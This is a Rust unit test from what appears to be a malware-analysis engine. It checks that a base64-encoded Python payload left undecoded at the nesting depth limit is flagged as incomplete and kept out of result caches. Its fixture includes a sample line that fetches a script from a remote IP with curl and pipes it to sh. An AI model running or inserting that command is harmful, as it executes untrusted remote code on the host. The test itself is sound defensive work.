/// A payload left undecoded at the nesting limit records `NestingLimit`, so
/// `evaluation_incomplete` keeps the report out of the content-keyed caches:
/// the limit counts from where the analysis began, and the same bytes
/// analyzed directly decode further.
#[test]
fn payload_past_the_depth_limit_records_a_gap() {
    use crate::types::{AnalysisGap, AnalysisReport, ExtractedPayload, TargetInfo};
    let source = b"import base64\nexec(base64.b64decode('aW1wb3J0IG9zCg=='))\n";
    let mut report = AnalysisReport::new(TargetInfo {
        path: "layer.py".to_string(),
        file_type: "python".to_string(),
        size_bytes: source.len() as u64,
        sha256: String::new(),
        architectures: None,
    });
    let decoded = b"import os\nos.system('curl -s http://198.51.100.23/x | sh')\n".to_vec();
    let payload = ExtractedPayload {
        preview: String::from_utf8_lossy(&decoded).into_owned(),
        data: decoded,
        encoding_chain: vec!["base64".to_string()],
        detected_type: crate::FileType::Python,
        original_offset: 14,
    };
    super::process_encoded_payloads(
        vec![payload],
        &mut report,
        std::path::Path::new("layer.py"),
        source,
        crate::FileType::Python,
        super::MAX_ANALYSIS_DEPTH,
        &crate::AnalysisOptions::default(),
        &crate::Engine::empty(),
    );
    assert!(
        report.analysis_gaps.contains(AnalysisGap::NestingLimit),
        "findings: {:?}",
        report
            .findings
            .iter()
            .map(|f| f.id.as_ref())
            .collect::<Vec<_>>()
    );
    assert!(crate::analysis_cache::evaluation_incomplete(&report));
}
